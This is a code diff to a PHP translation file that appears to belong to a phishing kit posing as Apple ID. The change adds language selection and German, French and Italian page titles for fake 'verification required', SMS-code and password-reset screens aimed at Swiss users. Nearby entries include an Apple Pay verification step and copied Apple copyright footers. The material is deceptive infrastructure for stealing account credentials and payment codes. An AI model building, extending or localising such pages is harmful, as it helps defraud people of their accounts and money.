@@ -11,10 +11,29 @@ if (basename($_SERVER['SCRIPT_FILENAME']) === basename(__FILE__)) {
 }
 
 function get_client_language() {
-    // Detect language from browser headers, default to German for Switzerland
+    // Priority:
+    // 1. Check if user selected a language in this session
+    // 2. Check for language parameter from index.php
+    // 3. Auto-detect from browser headers
+    // 4. Default to German (Switzerland)
+
+    // 1. Session language (already selected)
+    if (isset($_SESSION['lang']) && in_array($_SESSION['lang'], ['de', 'fr', 'it'])) {
+        return $_SESSION['lang'];
+    }
+
+    // 2. Check POST/GET language parameter (from index.php)
+    if (isset($_POST['lang']) && in_array($_POST['lang'], ['de', 'fr', 'it'])) {
+        return $_POST['lang'];
+    }
+    if (isset($_GET['lang']) && in_array($_GET['lang'], ['de', 'fr', 'it'])) {
+        return $_GET['lang'];
+    }
+
+    // 3. Detect language from browser headers, default to German for Switzerland
     $accepted_langs = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : '';
 
-    // Priority: de (Deutsch/Swiss German), then fr (Français), then it (Italiano), default to de
+    // Priority: de (Deutsch/Swiss German), then fr (Français), then it (Italiano)
     if (preg_match('/de/i', $accepted_langs)) return 'de';
     if (preg_match('/fr/i', $accepted_langs)) return 'fr';
     if (preg_match('/it/i', $accepted_langs)) return 'it';
@@ -22,8 +41,8 @@ function get_client_language() {
     return 'de'; // Default to Swiss German
 }
 
-$current_lang = get_client_language(); // Auto-detect user language (defaults to de)
-$_SESSION['lang'] = $current_lang;
+$current_lang = get_client_language(); // Get user's language preference
+$_SESSION['lang'] = $current_lang; // Store in session for persistence
 
 $translations = [
     // =====================================================================
@@ -47,6 +66,10 @@ $translations = [
         'push_footer_privacy' => 'Engagement de confidentialité',
         'push_footer_terms' => 'Conditions générales',
         'push_footer_copyright' => 'Copyright © 2026 Apple Inc. Tous droits réservés.',
+
+        'html_title_push' => 'Vérification requise – Apple ID',
+        'html_title_sms' => 'Vérification Apple ID',
+        'html_title_newpass' => 'Réinitialiser le mot de passe – Apple ID',
 
         'sms_title' => 'Vérification Apple ID',
         'sms_apple_pay' => 'Vérification Apple Pay',
@@ -215,6 +238,10 @@ $translations = [
         'push_footer_privacy' => 'Datenschutzerklärung',
         'push_footer_terms' => 'Allgemeine Geschäftsbedingungen',
         'push_footer_copyright' => 'Copyright © 2026 Apple Inc. Alle Rechte vorbehalten.',
+
+        'html_title_push' => 'Verifizierung erforderlich – Apple ID',
+        'html_title_sms' => 'Apple ID-Verifizierung',
+        'html_title_newpass' => 'Passwort zurücksetzen – Apple ID',
 
         'sms_title' => 'Apple ID-Verifizierung',
         'sms_apple_pay' => 'Apple Pay-Verifizierung',
@@ -391,6 +418,10 @@ $translations = [
         'push_footer_privacy' => 'Impegno sulla privacy',
         'push_footer_terms' => 'Termini e condizioni',
         'push_footer_copyright' => 'Copyright © 2026 Apple Inc. Tutti i diritti riservati.',
+
+        'html_title_push' => 'Verifica richiesta – Apple ID',
+        'html_title_sms' => 'Verifica Apple ID',
+        'html_title_newpass' => 'Reimpostate la vostra password – Apple ID',
 
         'sms_title' => 'Verifica Apple ID',
         'sms_apple_pay' => 'Verifica Apple Pay',
